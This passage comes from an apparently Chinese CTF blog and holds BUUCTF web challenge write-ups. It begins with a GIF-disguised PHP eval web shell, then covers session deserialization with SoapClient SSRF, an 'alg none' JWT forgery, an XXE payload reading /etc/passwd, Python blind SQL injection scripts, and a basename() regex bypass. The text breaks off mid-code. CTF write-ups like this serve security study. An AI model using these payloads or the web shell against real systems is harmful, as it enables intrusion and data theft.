<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript"> @<span class="built_in">eval</span>($_POST[<span class="string">'pass'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/15/BUU-Web%E4%B8%80/30.png" alt><br>然后使用蚁剑连接后成功得到flag<br><img src="/2020/03/15/BUU-Web%E4%B8%80/31.png" alt></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-web七</title>
    <url>/2020/07/14/buu-web-7/</url>
    <content><![CDATA[<p><strong>bestphp’s revenge</strong><br>知识点：SESSION反序列化、php原生类ssrf</p>
<p><strong>[HFCTF2020]EasyLogin</strong><br>知识点：jwt 伪造</p>
<p><strong>NCTF2019]True XML cookbook</strong><br>知识点：xxe内网探测</p>
<p><strong>[GYCTF2020]Ezsqli</strong><br>知识点：盲注、无列名注入</p>
<p><strong>[ZerOpts2020]Can you guess it?</strong><br>知识点：basename()函数缺陷</p>
<p><strong>[XNUCA2019Qualifier]EasyPHP</strong><br>知识点：.htaccess文件写入利用</p>
<p><strong>[网鼎杯2018]Unfinish</strong><br>知识点：异或注入</p>
<a id="more"></a>

<h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p>考点：SESSION反序列化、SSRF、PHP原生类利用</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="相关语法"><a href="#相关语法" class="headerlink" title="相关语法"></a>相关语法</h2><p><strong>call_user_func</strong></p>
<p><code>call_user_func($filter, $value)</code>，这个函数的作用是把第一个参数作为回调函数调用</p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">barber</span><span class="params">($type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You wanted a $type haircut, no problem\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">'barber'</span>, <span class="string">"mushroom"</span>);  <span class="comment">//输出You wanted a mushroom haircut, no problem</span></span><br><span class="line">call_user_func(<span class="string">'barber'</span>, <span class="string">"shave"</span>);  <span class="comment">//输出You wanted a shave haircut, no problem</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>该函数不仅可以调用自定义函数，还可以调用php内置函数，比如extract</p>
<p><strong>extract</strong><br>extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量<br><strong>当我们的第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调</strong></p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>,<span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$a = Cat; $b = Dog; $c = Horse</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="SESSION反序列化"><a href="#SESSION反序列化" class="headerlink" title="SESSION反序列化"></a>SESSION反序列化</h2><p>参考文章：<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
<p><strong>存储机制</strong></p>
<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。<br>存储的文件是以<code>sess_sessionid</code>来进行命名的，文件的内容就是session值的序列话之后的内容。<br>假设我们的环境是xampp，那么默认配置如上所述。</p>
<ul>
<li><strong>在默认配置情况下：</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'CyzCc'</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593336739916.png" alt="1593336739916"></p>
<p>在D:\phpstudy_pro\wamp64\tmp中储存文件名是<code>sess_ac6df8h5uipildrmf4lm79agd7</code>，文件的内容是<code>name|s:5:&quot;CyzCc&quot;;</code>。name是键值，<code>s:5:&quot;CyzCc&quot;;</code>是<code>serialize(&quot;CyzCc&quot;)</code>的结果</p>
<ul>
<li><strong>在php_serialize引擎下</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set('session.serialize_handler', 'php_serialize');</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'CyzCc'</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593336821405.png" alt="1593336821405"></p>
<p>SESSION文件的内容是<code>a:1:{s:4:&quot;name&quot;;s:5:&quot;CyzCc&quot;;}</code>。<code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
<ul>
<li><strong>在php_binary引擎下：</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'CyzCc'</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>口names:5:&quot;CyzCc&quot;;</code>。由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>口names:5:&quot;CyzCc&quot;;</code></p>
<p><img src="/2020/07/14/buu-web-7/1593337592603.png" alt="1593337592603"></p>
<p><strong>PHP Session中的序列化危害</strong></p>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:11:"PeopleClass":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure>

<p>上述的$_SESSION的数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:{s:5:&quot;CyzCc&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;}</code>。<br>但是我们在进行读取的时候，选择的是<code>php</code>，那么最后读取的内容是:</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (<span class="built_in">size</span>=<span class="number">1</span>)</span><br><span class="line">  <span class="string">'a:1:&#123;s:5:"CyzCc";s:24:"'</span> =&gt; </span><br><span class="line">    object(__PHP_Incomplete_Class)[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">public</span> <span class="string">'__PHP_Incomplete_Class_Name'</span> =&gt; <span class="keyword">string</span> <span class="string">'PeopleClass'</span> (length=<span class="number">11</span>)</span><br></pre></td></tr></table></figure>

<p>这是因为当使用php引擎的时候，php引擎会以<strong>|</strong>作为作为key和value的分隔符，那么就会将<code>a:1:{s:5:&quot;CyzCc&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:{}</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。<br>这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<p><strong>实际利用</strong></p>
<p>1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"CyzCc"</span>]=$_GET[<span class="string">"a"</span>];</span><br></pre></td></tr></table></figure>

<p>22.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在1.php和22.php中所使用的SESSION的引擎不一样，就形成了一个漏洞，1.php使<br>用<code>php_serialize</code>，22.php使用php来处理session</p>
<p>访问1.php的时候，通过a传入<code>a=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:13:&quot;echo &quot;12345&quot;;&quot;;}</code><br>此时生成的session为<br><code>a:1:{s:5:&quot;CyzCc&quot;;s:47:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:13:&quot;echo &quot;12345&quot;;&quot;;}&quot;;}</code><br>这时候再去访问22.php，发现成功实例化了lemon这个类，并且执行了echo。因为在访问22.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法<br><img src="/2020/07/14/buu-web-7/1593339016638.png" alt="1593339016638"></p>
<h2 id="php原生类进行ssrf"><a href="#php原生类进行ssrf" class="headerlink" title="php原生类进行ssrf"></a>php原生类进行ssrf</h2><p>由于源码中没有类，所以可以使用php原生类进行反序列化<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">利用php原生类SoapClient中的__call方法进行SSRF</a></p>
<p>解题思路：<br>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>扫描目录得到flag.php，访问显示只能本地访问<br><img src="/2020/07/14/buu-web-7/1593341561897.png" alt="1593341561897"></p>
<p>明显需要利用ssrf来进行攻击</p>
<p><strong>利用回调函数覆盖session序列化引擎为php_serilaze</strong></p>
<p><strong>构造SSRF的Soap类的序列化字符串</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; $url, <span class="string">'location'</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"|"</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>通过上面覆盖的序列化引擎将该payload字符串写入session文件</p>
<p><img src="/2020/07/14/buu-web-7/1593350945909.png" alt="1593350945909"></p>
<p>此时session_start()序列化使用的是php引擎。接下来使用extract覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf。并获得访问flag.php的PHPSESSID。</p>
<p><img src="/2020/07/14/buu-web-7/1593351008912.png" alt="1593351008912"></p>
<p>之后修改PHPSESSID即可获得flag<br><img src="/2020/07/14/buu-web-7/1593351044198.png" alt="1593351044198"></p>
<p><strong>解析 payload</strong></p>
<ol>
<li>第一步，f传的值和post的值使其使用php_serialize引擎。而name的值就是将我们的name值以php_serialize引擎的格式存储起来。</li>
<li>这次发的请求使用的是默认的php引擎，我们f传值和post传值来使<code>call_user_func($b, $a);</code>变成<code>call_user_func($a);</code>而$a 为一个数组且第一个值就是我们传入的SoapClient作为类，而第二个值<code>welcome_to_the_lctf2018</code>为方法，很显然没这个方法从而调用<code>SoapClient的__call</code>函数、执行ssrf。</li>
<li>最后就是已我们设置的cookie去访问了，它会返回<code>$_SESSION</code>而此时我们的flag已经在里面了。</li>
</ol>
<p>参考文章：<br><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a></p>
<p><a href="https://mayi077.gitee.io/2020/05/04/bestphp-s-revenge/" target="_blank" rel="noopener">https://mayi077.gitee.io/2020/05/04/bestphp-s-revenge/</a></p>
<h1 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h1><p>考点：jwt 伪造</p>
<p>打开题目为一个登陆框，可以注册用户</p>
<p><img src="/2020/07/14/buu-web-7/1593417082681.png" alt="1593417082681"></p>
<p>注册登录后猜测应该是需要admin登陆才能得到flag<br>先注册一个用户，在登陆的时候抓包<br><img src="/2020/07/14/buu-web-7/1593417187273.png" alt="1593417187273"></p>
<p>发现有一个jwt格式的字符串，解密<br><img src="/2020/07/14/buu-web-7/1593417288861.png" alt="1593417288861"></p>
<p>这里直接设置secretid为数组加密算法为空，修改username为admin即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"none"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;.</span><br><span class="line">&#123;<span class="string">"secretid"</span>:[],<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"123456"</span>,<span class="string">"iat"</span>:<span class="number">1589875776</span>&#125;.</span><br></pre></td></tr></table></figure>

<p>将上面的字符串进行两次base64编码，之后拼接。每一段后面的<code>.</code>不能省略<br><img src="/2020/07/14/buu-web-7/1593417554134.png" alt="1593417554134"></p>
<p>登陆成功</p>
<p>点击getflag再抓包go一次即可<br><img src="/2020/07/14/buu-web-7/1593417607446.png" alt="1593417607446"></p>
<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>知识点：xxe探测内网<br><img src="/2020/07/14/buu-web-7/1593418704270.png" alt="1593418704270"></p>
<p>题目给出为xxe，直接抓包构造payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY admin SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admina&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/14/buu-web-7/1593418770073.png" alt="1593418770073"></p>
<p>读取文件成功，之后读取/etc/hosts文件<br><img src="/2020/07/14/buu-web-7/1593418805402.png" alt="1593418805402"></p>
<p>发现一个ip，使用http协议访问。显示不存在，之后通过burp去爆破发现<code>173.198.168.11</code>存在，访问得到flag</p>
<p><img src="/2020/07/14/buu-web-7/1593418941330.png" alt="1593418941330"></p>
<h1 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h1><p>知识点：盲注，无列名注入</p>
<p>sql注入，只有一个输入框，进行抓包测试</p>
<p><img src="/2020/07/14/buu-web-7/1593421986588.png" alt="1593421986588"></p>
<p><img src="/2020/07/14/buu-web-7/1593422003553.png" alt="1593422003553"></p>
<p><img src="/2020/07/14/buu-web-7/1593422047435.png" alt="1593422047435"></p>
<p><img src="/2020/07/14/buu-web-7/1593422059257.png" alt="1593422059257"></p>
<p>测试之后确定可以使用bool盲注，当条件不成立的时候回显<code>Error Occured When Fetch Result.</code><br>fuzz一下过滤的字符串<br><img src="/2020/07/14/buu-web-7/1593422138285.png" alt="1593422138285"></p>
<p>可以先把数据库名跑出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://11de6aef-1432-4c03-9739-971d67b1f985.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = <span class="string">"1 &amp;&amp; ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line">        payload2 = <span class="string">"1 &amp;&amp; ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database()),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data = data)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high) // <span class="number">2</span></span><br><span class="line">    result+=chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>得到数据库名为<code>give_grandpa_pa_pa_pa</code><br><img src="/2020/07/14/buu-web-7/1593423856311.png" alt="1593423856311"></p>
<p>表名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> &amp;&amp; ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),<span class="number">6</span>,<span class="number">1</span>))&gt;<span class="number">44</span></span><br></pre></td></tr></table></figure>

<p>过滤了information.schema.tables，可以用sys.schema_table_statistics_with_buffer代替</p>
<p>得到表名为：<code>f1ag_1s_h3r3_hhhhh</code><br>但是我们无法得到列名，这时候需要使用无列名注入</p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>参考文章：<a href="https://www.gem-love.com/ctf/1782.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1782.html</a></p>
<p>这里用到了ascii位偏移</p>
<p><img src="/2020/07/14/buu-web-7/1593427192361.png" alt="1593427192361"></p>
<p><img src="/2020/07/14/buu-web-7/1593427039728.png" alt="1593427039728"></p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://11de6aef-1432-4c03-9739-971d67b1f985.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        hexchar = flag + chr(char)</span><br><span class="line">        payload = <span class="string">'2||((select 1,"&#123;&#125;")&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">'id'</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到flag转换为小写即可</p>
<p>参考文章：<a href="https://blog.csdn.net/weixin_43940853/article/details/106164162" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43940853/article/details/106164162</a></p>
<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));<span class="comment">//生成一串随机字符串</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>$_SERVER[‘PHP_SELF’]</strong></p>
<blockquote>
<p>获取当前 php 文件相对于网站根目录的位置地址</p>
</blockquote>
<p>当输入的guess与$secret相等时输出flag，但是几乎 不可能。<br>之后发现传入source之后可以highlight_file读取文件，并且过滤掉了config.php，所以这里应该是突破点。</p>
<p><img src="/2020/07/14/buu-web-7/1593480992149.png" alt="1593480992149">)当我访问index.php/config.php时，浏览器仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码获取flag</p>
<p>正则表达式<code>/config\.php\/*$/i</code>匹配的为$_SERVER[‘PHP_SELF’]的结尾，这里可以通过%0d进行污染绕过，这样仍然访问的index.php<br><img src="/2020/07/14/buu-web-7/1593486428166.png" alt="1593486428166"></p>
<p>从 <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> 找到了basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(basename(<span class="string">"xffconfig.php"</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">"config.php/xff"</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>

<p>所以可以构造payload</p>
<blockquote>
<p>index.php/config.php/%ff?source</p>
</blockquote>
<p><img src="/2020/07/14/buu-web-7/1593487324170.png" alt="1593487324170"></p>
<p>参考文章：<a href="https://blog.csdn.net/qq_43801002/java/article/details/105835367" target="_blank" rel="noopener">https://blog.csdn.net/qq_43801002/java/article/details/105835367</a></p>
<h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span 